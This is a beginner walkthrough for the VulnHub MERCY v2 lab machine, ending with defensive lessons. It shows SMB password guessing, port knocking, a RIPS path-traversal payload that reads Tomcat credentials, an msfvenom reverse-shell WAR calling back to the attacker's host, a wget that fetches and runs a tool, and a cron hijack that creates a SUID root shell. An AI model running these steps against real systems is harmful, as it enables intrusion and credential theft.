# digitalworld.local: MERCY v2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: MERCY v2 |
| **Difficulty** | Intermediate |
| **Author** | Donavan (digitalworld.local series) |
| **Released** | 28 December 2018 |
| **VulnHub Entry** | [digitalworld.local: MERCY v2 on VulnHub](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/) |
| **Download** | [MERCY-v2.zip on VulnHub](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu, Samba/Tomcat/Dovecot stack) |

> **About this box:** MERCY v2 is a *chain of small steps* rather than one big exploit. You enumerate
> a Samba share, brute-force a weak password, read a `knockd` config, use **port knocking** to open
> hidden ports, exploit a **Local File Inclusion** to read Tomcat credentials, then land a **cron
> job hijack**. The official description warns: some builds allow a kernel exploit — do not use it,
> there is a cleaner intended path. Versions and paths "vary by build".

**Legal note:** Only run this against the VM you downloaded, on an isolated host-only network that
you own. Never point these techniques at systems you do not have written permission to test.

---

## 0. What you will learn

By the end of this box you will have practised:

- **Methodical enumeration** across a *wide* port range with `nmap`.
- **SMB enumeration** with `enum4linux`, `crackmapexec` and `smbmap` — finding users and shares.
- **Password brute-forcing** a file-share login and understanding *why* a weak policy is dangerous.
- **Port knocking** — reading a `knockd` configuration and using it to open a firewalled service.
- **Re-scanning after a state change**: new ports appear only *after* the knock.
- **Finding and using a Local File Inclusion (LFI)** against the RIPS 0.53 tool to read files.
- **Reading Tomcat user config** to obtain Manager credentials.
- **Deploying a WAR web shell** through the Tomcat Manager to get code execution.
- **Cron-job privilege escalation**: overwriting a script that root runs on a schedule.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import the OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own address first:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

Then sweep the subnet with ARP:

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks ICMP pings. It is the quickest way to find a freshly-booted VM.

![arp-scan showing the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Full TCP sweep

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/mercy-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. On MERCY this matters, because the most
> important ports are *not* in the default top-1000 set.

### 2.2 Service and version detection

```bash
sudo nmap -sC -sV -p 22,53,80,110,139,143,445,993,995,8080 -oA scans/mercy-services 192.168.56.101
```

```text
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh         (no-response — firewalled)
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
80/tcp   filtered http        (no-response — firewalled)
110/tcp  open     pop3        Dovecot pop3d
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X
143/tcp  open     imap        Dovecot imapd (Ubuntu)
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu
993/tcp  open     ssl/imap    Dovecot imapd
995/tcp  open     ssl/pop3    Dovecot pop3d
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
```

> **How to read it:** Two services are **`filtered`** — SSH (22) and HTTP (80). "Filtered" means a
> firewall is silently dropping packets, not that nothing is there. Something is going to *open* them
> later. Port **8080 runs Tomcat**. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Enumerate SMB users and shares

```bash
enum4linux -a 192.168.56.101
```

```text
[+] Found 2 users via 'enumdomusers'
'1000': username: pleadformercy   name: QIU
'1001': username: qiu
```

```bash
crackmapexec smb 192.168.56.101 -u 'guest' -p '' --shares
```

```text
[+] \guest:
[+] Share           Permissions     Remark
qiu                                 (a user home exposed as a share)
print$                              Printer Drivers
IPC$                                IPC Service
```

> **How to read it:** Two usernames (`pleadformercy`, `qiu`) and — critically — a **share named
> `qiu`** that we can't read yet. Note Tomcat on 8080 is also waiting.

### 2.4 Directory brute-force Tomcat (port 8080)

```bash
ffuf -u http://192.168.56.101:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .html,.txt,.php -c
```

```text
docs           [Status: 302]
examples       [Status: 302]
host-manager   [Status: 302]
manager        [Status: 302]
robots.txt     [Status: 200]
```

```bash
curl -s http://192.168.56.101:8080/robots.txt
```

```text
User-agent: *
Disallow: /tryharder/tryharder
```

### 2.5 A base64 "hint" page

```bash
curl -s http://192.168.56.101:8080/tryharder/tryharder | base64 -d
```

```text
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important.
Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an
employee's desk! ...
```

> **Why it matters:** The author is *telling* us a password is trivially weak — think "password".
> This is the nudge toward brute-forcing the SMB share named `qiu`.

---

## 3. Foothold

### 3.1 Brute-force the `qiu` SMB share login

Try a short list of common passwords against the `qiu` account:

```bash
smbmap -H 192.168.56.101 -u 'qiu' -p 'password'
```

```text
Disk    Permissions   Comment
qiu     READ ONLY
print$  READ ONLY     Printer Drivers
IPC$    NO ACCESS     IPC Service
```

> **Why it works:** The account `qiu` uses the password `password`. Weak passwords fall to a tiny
> wordlist instantly. This is the "cyber hygiene" lesson made concrete.

### 3.2 Download the share contents

```bash
mkdir loot
smbclient //192.168.56.101/qiu -U qiu -c 'prompt;recurse;mget *'
# Password: password
find loot -type f
```

```text
loot/.bash_history
loot/.private/readme.txt
loot/.private/opensesame/config
loot/.private/opensesame/configprint
loot/.profile
```

> **How to read it:** A user's home directory is being shared over SMB. Two files under
> `.private/opensesame/` look interesting: `config` and `configprint`.

### 3.3 Read the knockd configuration

```bash
cat loot/.private/opensesame/configprint
```

```text
[options]
    UseSyslog

[openSSH]
    sequence    = 159,27391,4
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[openHTTP]
    sequence    = 17301,28504,9999
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
    tcpflags    = syn
```

> **Why it works:** `knockd` opens a firewalled port only if the client connects to a secret
> **sequence of ports** in order. This file tells us the exact sequence to open SSH (22) and HTTP (80)
> — the two ports nmap reported as `filtered`.

### 3.4 Knock to open the hidden ports

```bash
knock 192.168.56.101 159 27391 4
knock 192.168.56.101 17301 28504 9999
```

> **How to read it:** The `knock` client connects to each port in turn, sending the SYN packets the
> firewall daemon is listening for. Order matters and the whole sequence must finish inside the
> `seq_timeout`.

Confirm the ports are now open:

```bash
nmap -p 22,80 192.168.56.101
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> **Why it works:** The knock added temporary firewall rules allowing *our* IP only. Note SSH (22)
> opened — useful, because we are about to recover a password.

### 3.5 Investigate the newly opened web server (port 80)

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
User-agent: *
Disallow: /mercy
Disallow: /nomercy
```

Browse `/nomercy` — the page footer reveals **RIPS 0.53**, a static-analysis tool with a known LFI:

```bash
searchsploit rips 0.53
```

```text
RIPS 0.53 - Multiple Local File Inclusions | php/webapps/18660.txt
```

> **Why it matters:** The proof-of-concept uses a `file` parameter, e.g.
> `.../code.php?file=../../../../../../etc/passwd`. It is unauthenticated.

### 3.6 Confirm the LFI

```bash
curl -s 'http://192.168.56.101/nomercy/windows/code.php?file=../../../../../../etc/passwd'
```

```text
root:x:0:0:root:/root:/bin/bash
...
tomcat7:x:...:/var/lib/tomcat7:/bin/false
```

> **How to read it:** Arbitrary file read. Our goal is a **credential file**, and we know a Tomcat
> server is running on 8080.

### 3.7 Steal Tomcat Manager credentials

```bash
curl -s 'http://192.168.56.101/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml'
```

```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="manager-gui"/>
  <user username="fluffy" password="freakishfluffybunny" roles="manager-gui"/>
</tomcat-users>
```

> **Why it works:** `tomcat-users.xml` stores Manager panel users. The LFI reads it as the web user.
> Note the second account — **`fluffy`** — we will need that later. Strings vary by build.

### 3.8 Deploy a WAR reverse shell via Tomcat Manager

Build a WAR payload that drops a JSP web shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f war -o rev.war
jar -xvf rev.war        # note the randomly-named .jsp inside
```

Log in to `http://192.168.56.101:8080/manager/html` with
`thisisasuperduperlonguser:heartbreakisinevitable`, deploy `rev.war`, start a listener, then request
the JSP:

```bash
nc -lvnp 4444
curl http://192.168.56.101:8080/rev/<random>.jsp
```

```text
$ id
uid=... (tomcat7)
$ cat /local.txt
Plz have mercy on me! :-(
```

> **Why it works:** The Tomcat Manager lets an authenticated user deploy a web application archive.
> Tomcat unpacks the WAR and executes the JSP as the `tomcat7` service account. Upgrade the shell to
> a full TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

![Tomcat Manager deploy and reverse shell](images/03-foothold.png)

---

## 4. Privilege escalation

### 4.1 Pivot to `fluffy`

We already recovered `fluffy`'s password from `tomcat-users.xml`:

```bash
su fluffy
# Password: freakishfluffybunny
id
```

```text
uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
```

> **How to read it:** A real interactive account. Now hunt for privilege escalation from `fluffy`.

### 4.2 Find the writable script

```bash
find / -perm -o+w -type f 2>/dev/null
```

```text
/home/fluffy/.private/secrets/timeclock
```

```bash
ls -la /home/fluffy/.private/secrets/
```

```text
-rwxr-xr-x 1 fluffy fluffy   37 backup.save
-rw-r--r-- 1 fluffy fluffy   12 .secrets
-rwxrwxrwx 1 root   root    222 timeclock      <-- world-writable!
```

> **How to read it:** `timeclock` is owned by **root** but is world-writable (`rwxrwxrwx`). A
> world-writable file owned by root is a strong hint that root runs it — check the process list.

### 4.3 Confirm the cron job

Upload and run `pspy` to watch processes without needing root:

```bash
wget http://192.168.56.10:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

```text
CMD: UID=0  PID=...  | /bin/sh -c bash /home/fluffy/.private/secrets/timeclock
CMD: UID=0  PID=...  | bash /home/fluffy/.private/secrets/timeclock
```

> **Why it works:** `UID=0` means root is executing that script — on a repeating cron schedule.
> Because we can *write* the script, we can choose what root runs.

### 4.4 Hijack the script

```bash
cat /home/fluffy/.private/secrets/timeclock     # a harmless bash script

printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' \
  > /home/fluffy/.private/secrets/timeclock

# wait up to ~3 minutes for cron
ls -la /tmp/rootbash
/tmp/rootbash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** We replaced the cron script with one that copies `bash` to `/tmp` and sets the
> **SUID** bit. When root runs it, `rootbash` becomes a root-owned SUID binary; running it with `-p`
> (preserve privileges) yields a root shell regardless of who we are.

### 4.5 The root flag

```bash
cat /root/proof.txt
```

```text
Congratulations on rooting MERCY. :-)
```

> **Note:** Flag filenames and contents differ between builds. Look for `proof.txt` and
> `author-secret.txt` in `/root`. A **kernel** exploit is also reported to work on some builds — try
> harder, the cron path is the intended one.

![root and the flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SMB share `qiu` exposed with a weak password (`password`) | Samba, port 445 | Unauthorised read of a user's home directory |
| 2 | `knockd` configuration readable from the share | `.private/opensesame/config(print)` | Port-knock sequence disclosed; firewall bypass |
| 3 | RIPS 0.53 Local File Inclusion (`file=`) | Web app on port 80 | Arbitrary file read |
| 4 | Tomcat Manager credentials in a world-readable config | `tomcat-users.xml` | Web shell deployment as `tomcat7` |
| 5 | World-writable script executed by root cron | `/home/fluffy/.private/secrets/timeclock` | Full privilege escalation to root |

---

## 6. Defensive lessons (blue team)

- **Enforce strong passwords and lockouts.** A single weak share password exposed a user's home
  directory. Ban dictionary passwords and monitor failed authentication.
- **Do not expose home directories as SMB shares.** Share only purpose-built, permission-restricted
  directories.
- **Treat port knocking as a weak control.** It hides a service but its sequence can leak in a config
  file; pair it with proper authentication, not as the *only* barrier.
- **Patch vulnerable web tools.** RIPS 0.53 is ancient and ships an LFI; remove unused tools from
  production web roots.
- **Protect Tomcat Manager.** Store `tomcat-users.xml` with strict permissions, use strong unique
  passwords, and disable the Manager/host-manager apps if unused.
- **Audit scheduled tasks and file permissions.** Never let root run a world-writable script. Mount
  `/home` `nosuid` and monitor cron changes with a file-integrity tool.

---

## 7. References

- [VulnHub official entry — digitalworld.local: MERCY v2](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/)
- [Exploit-DB 18660 — RIPS 0.53 Multiple Local File Inclusions](https://www.exploit-db.com/exploits/18660)
- [knockd — port-knocking daemon](https://linux.die.net/man/1/knockd)
- [Apache Tomcat Manager documentation](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)
- [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [OWASP — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP scan highlighting filtered 22/80 and Tomcat on 8080
- [ ] `images/03-foothold.png` — SMB loot, the knockd config, and the Tomcat shell
- [ ] `images/04-knock.png` — `knock` opening the ports, then nmap showing them open
- [ ] `images/05-lfi.png` — RIPS LFI reading `tomcat-users.xml`
- [ ] `images/06-tomcat-deploy.png` — WAR deployed and reverse shell caught
- [ ] `images/07-cron.png` — `pspy` showing root running `timeclock`
- [ ] `images/08-root-flag.png` — root shell and `proof.txt`

> **How to read it:** Store screenshots in `labs/digitalworldlocal-mercy-v2/images/` and reference
> them here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
